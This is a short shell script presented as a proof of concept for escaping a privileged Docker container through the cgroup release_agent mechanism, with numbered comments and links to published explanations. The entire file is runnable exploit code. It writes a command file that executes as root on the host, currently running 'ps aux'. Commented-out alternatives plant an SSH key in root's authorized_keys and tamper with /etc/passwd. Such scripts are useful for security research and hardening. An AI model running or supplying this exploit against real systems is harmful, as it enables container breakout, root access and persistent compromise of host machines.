#!/bin/sh

# PoC to escape from a Docker privileged container

# [1] https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
# [2] https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1
# [3] https://www.youtube.com/watch?v=8gDP3nJMlJI

# 1. The first step is to create a new cgroup (i.e. /tmp/cgrp).
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# 2. Next, we activate the release_agent file to be executed once all the proccess in the cgroup are killed.
echo 1 > /tmp/cgrp/x/notify_on_release

# 3. Write the path of the command file into the release_agent file
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 4. Write into the command file the command to be executed, and give execute permission to the file.
echo '#!/bin/sh' > /cmd

# The following is the command that will be run on the host.
echo "ps aux > $host_path/output" >> /cmd
# cat id_dsa.pub >> /root/.ssh/authorized_keys
# cat /etc/passwd >> /etc/passwd

chmod a+x /cmd

# 5. Trigger the exploit by spawning a process that immediately ends inside the cgroup created before, that will execute the release_agent file afterwards.
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"